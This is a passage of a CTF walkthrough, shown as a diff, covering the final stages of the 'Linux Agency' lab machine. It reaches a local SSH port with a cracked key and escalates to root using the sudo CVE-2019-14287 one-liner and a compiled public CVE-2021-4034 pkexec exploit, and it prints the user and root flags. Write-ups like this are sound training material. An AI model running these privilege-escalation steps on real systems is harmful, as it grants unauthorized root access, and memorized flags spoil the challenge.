@@ -1060,4 +1060,198 @@ Use the "--show" option to display all of the cracked passwords reliably
 Session completed.
 ```
 
+- Now in the compromised machine, give id_rsa permissions
 
+- There is no user `robert` on the machine
+
+```console
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+uuidd:x:105:111::/run/uuidd:/usr/sbin/nologin
+avahi-autoipd:x:106:112:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/usr/sbin/nologin
+usbmux:x:107:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+dnsmasq:x:108:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+rtkit:x:109:114:RealtimeKit,,,:/proc:/usr/sbin/nologin
+speech-dispatcher:x:110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/false
+whoopsie:x:111:117::/nonexistent:/bin/false
+kernoops:x:112:65534:Kernel Oops Tracking Daemon,,,:/:/usr/sbin/nologin
+saned:x:113:119::/var/lib/saned:/usr/sbin/nologin
+pulse:x:114:120:PulseAudio daemon,,,:/var/run/pulse:/usr/sbin/nologin
+avahi:x:115:122:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/usr/sbin/nologin
+colord:x:116:123:colord colour management daemon,,,:/var/lib/colord:/usr/sbin/nologin
+hplip:x:117:7:HPLIP system user,,,:/var/run/hplip:/bin/false
+geoclue:x:118:124::/var/lib/geoclue:/usr/sbin/nologin
+agent47:x:1000:1000:agent47,,,:/home/agent47:/bin/bash
+sshd:x:121:65534::/run/sshd:/usr/sbin/nologin
+mission1:x:1001:1001::/home/mission1:/bin/bash
+mission2:x:1002:1002::/home/mission2:/bin/bash
+mission3:x:1003:1003::/home/mission3:/bin/bash
+mission4:x:1004:1004::/home/mission4:/bin/bash
+mission5:x:1005:1005::/home/mission5:/bin/bash
+mission6:x:1006:1006::/home/mission6:/bin/bash
+mission7:x:1007:1007::/home/mission6:/bin/bash
+mission8:x:1008:1008::/home/mission8:/bin/bash
+mission9:x:1009:1009::/home/mission9:/bin/bash
+mission10:x:1010:1010::/home/mission10:/bin/bash
+mission11:x:1011:1011::/home/mission11:/bin/bash
+mission12:x:1012:1012::/home/mission12:/bin/bash
+mission13:x:1013:1013::/home/mission13:/bin/bash
+mission14:x:1014:1014::/home/mission14:/bin/bash
+mission15:x:1015:1015::/home/mission15:/bin/bash
+mission16:x:1016:1016::/home/mission16:/bin/bash
+mission17:x:1017:1017::/home/mission17:/bin/bash
+mission18:x:1018:1018::/home/mission18:/bin/bash
+mission19:x:1019:1019::/home/mission19:/bin/bash
+mission20:x:1020:1020::/home/mission20:/bin/bash
+mission21:x:1021:1021::/home/mission21:/bin/sh
+mission22:x:1022:1022::/home/mission22:/usr/bin/python3
+mission23:x:1023:1023::/home/mission23:/bin/bash
+mission24:x:1024:1024::/home/mission24:/bin/bash
+mission25:x:1025:1025::/home/mission25:/bin/bash
+mission26:x:1026:1026::/home/mission26:/bin/bash
+mission27:x:1027:1027::/home/mission27:/bin/bash
+mission28:x:1028:1028::/home/mission28:/usr/bin/irb
+mission29:x:1029:1029::/home/mission29:/bin/bash
+mission30:x:1030:1030::/home/mission30:/bin/bash
+viktor:x:1031:1031::/home/viktor:/bin/bash
+silvio:x:1032:1032::/home/silvio:/bin/bash
+reza:x:1033:1033::/home/reza:/bin/bash
+dalia:x:1034:1034::/home/dalia:/bin/bash
+jordan:x:1035:1035::/home/jordan:/bin/bash
+ken:x:1036:1036::/home/ken:/bin/bash
+sean:x:1037:1037::/home/sean:/bin/bash
+penelope:x:1038:1038::/home/penelope:/bin/bash
+maya:x:1039:1039::/home/maya:/bin/bash
+xyan1d3:x:1040:1040::/home/xyan1d3:/bin/bash
+0z09e:x:1041:1041::/home/0z09e:/bin/bash
+diana:x:1042:1042::/home/diana:/bin/bash
+zerotier-one:x:999:999::/var/lib/zerotier-one:/bin/sh
+```
+
+- There me be a private port running on the machine to other machine, checked it with `ss -nlpt`
+
+```console
+maya@linuxagency:~$ ss -nlpt
+State                  Recv-Q                   Send-Q                                      Local Address:Port                                      Peer Address:Port
+LISTEN                 0                        128                                             127.0.0.1:2222                                           0.0.0.0:*
+LISTEN                 0                        128                                             127.0.0.1:80                                             0.0.0.0:*
+LISTEN                 0                        128                                         127.0.0.53%lo:53                                             0.0.0.0:*
+LISTEN                 0                        128                                               0.0.0.0:22                                             0.0.0.0:*
+LISTEN                 0                        5                                               127.0.0.1:631                                            0.0.0.0:*
+LISTEN                 0                        128                                             127.0.0.1:36319                                          0.0.0.0:*
+LISTEN                 0                        128                                                  [::]:22                                                [::]:*
+LISTEN                 0                        5                                                   [::1]:631                                               [::]:*
+```
+
+- It should be `127.0.0.1:2222`.
+- Tried connecting with private key.
+
+```console
+maya@linuxagency:~/old_robert_ssh$ ssh -i id_rsa robert@127.0.0.1 -p 2222
+robert@127.0.0.1's password:
+Last login: Tue Jan 12 17:02:07 2021 from 172.17.0.1
+robert@ec96850005d6:~$
+```
+
+
+- We are in, but didn't find the user flag.
+
+```console
+robert@ec96850005d6:~$ ls
+robert.txt
+robert@ec96850005d6:~$ cat robert.txt 
+You shall not pass from here!!!
+
+I will not allow ICA to take over my world.
+```
+
+- Loaded linpeas for privilege escalation.
+- Found sudo version `1.8.21p2`.
+- It is vulnerable to [2019-14287](https://www.exploit-db.com/exploits/47502){:target="\_blank"}
+
+```console
+robert@ec96850005d6:~$ sudo -u#-1 /bin/bash
+root@ec96850005d6:~#
+```
+
+- Found user flag
+
+```console
+root@ec96850005d6:/root# cat success.txt
+47 you made it!!!
+
+You have made it, Robert has been taught a lesson not to mess with ICA.
+Now, Return to our Agency back with some safe route.
+All the previous door's have been closed.
+
+Good Luck Amigo!
+root@ec96850005d6:/root# cat user.txt
+user{620fb94d32470e1e9dcf8926481efc96}
+```
+
+- Connected with ssh as maya back to the machine.
+
+
+# Root flag
+
+- Now on maya loaded linpeas and found it vulnerable to [CVE-2021-4034](https://nvd.nist.gov/vuln/detail/cve-2021-4034){:target="\_blank"}
+- Found an [exploit](https://github.com/arthepsy/CVE-2021-4034){:target="\blank"}.
+- Loaded it to machine and compiled it.
+
+```console
+maya@linuxagency:~$ gcc cve-2021-4034-poc.c -o exploit
+maya@linuxagency:~$ ls
+cve-2021-4034-poc.c  examples.desktop  flag.txt        old_robert_ssh
+elusive_targets.txt  exploit           linpeas-new.sh
+```
+
+- Executed the exploit and got root.
+
+```console
+maya@linuxagency:~$ ./exploit
+# whoami
+root
+# cd /root
+# ls
+message.txt  root.txt
+# cat message.txt
+Nice Job 47
+We are really impressed with your skills
+
+Hope you enjoyed your journey!!
+
+Your director's of ICA
+   0z09e & Xyan1d3
+
+
+========>0z09e
+https://github.com/0z09e
+https://twitter.com/0z09e
+
+========>Xyan1d3
+https://twitter.com/xyan1d3
+https://github.com/xyan1d3
+# cat root.txt
+root{62ca2110ce7df377872dd9f0797f8476}
+```
